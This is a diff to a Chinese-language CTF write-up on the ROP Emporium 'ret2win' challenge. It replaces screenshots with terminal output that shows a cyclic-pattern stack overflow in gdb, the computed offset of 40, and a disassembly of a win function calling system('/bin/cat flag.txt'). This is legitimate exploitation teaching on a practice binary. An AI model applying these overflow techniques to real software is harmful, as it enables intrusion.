@@ -47,11 +47,22 @@ r               运行
 
 程序启动后，放入你用pwn cyclic生成的雷霆长度的模式串，此时，栈溢出，程序毫无疑问gg了。但gdb发力了，它为你展示的，是程序崩溃前的冻结影像！所以，经过前面的填充与覆盖，你需要找到的，便是rsp此时指向的地址(我们rop链真正开始的地方，也是我们应该覆盖到的地方)。
 
-![图片](/public/images/pwn/ROP%20Emporium/ret2win1.png)
+```terminal
+RBP  0x6161616161616161 ('aaaaaaaa')
+ RSP  0x7fffffffd5f8 ◂— 0x6161616161616166 ('faaaaaaa')
+ RIP  0x400755 (pwnme+109) ◂— ret 
+```
+
+
 
 显然其指向地址也已经被覆盖了，此时我们要做的便是将其复制，用我们的反查指令，查到偏移量。
 
-![图片](/public/images/pwn/ROP%20Emporium/ret2win2.png)
+```terminal
+pwn cyclic -n 8 -l 0x6161616161616166
+40
+```
+
+
 
 意料之中的40呢，offset的确定就到此为止了，接下来，我们去一睹程序真容，构造payload，拿到flag！
 
@@ -82,7 +93,20 @@ pdf @ sym.ret2win
 
 果然，`system`函数准备好了，甚至是我们要的字符串参数`"/bin/cat flag.txt"`都准备好了。
 
-![图片](/public/images/pwn/ROP%20Emporium/ret2win3.png)
+```terminal
+27: sym.ret2win ();
+│           0x00400756      55             push rbp
+│           0x00400757      4889e5         mov rbp, rsp
+│           0x0040075a      bf26094000     mov edi, str.Well_done__Heres_your_flag: ; 0x400926 ; "Well done! Here's your flag:" ; const char *s
+│           0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x00400764      bf43094000     mov edi, str._bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt" ; const char *string
+│           0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
+│           0x0040076e      90             nop
+│           0x0040076f      5d             pop rbp
+└           0x00400770      c3             ret
+```
+
+
 
 那还说啥，也就是说只要我们能跳到这个函数，flag就自动出来了
 
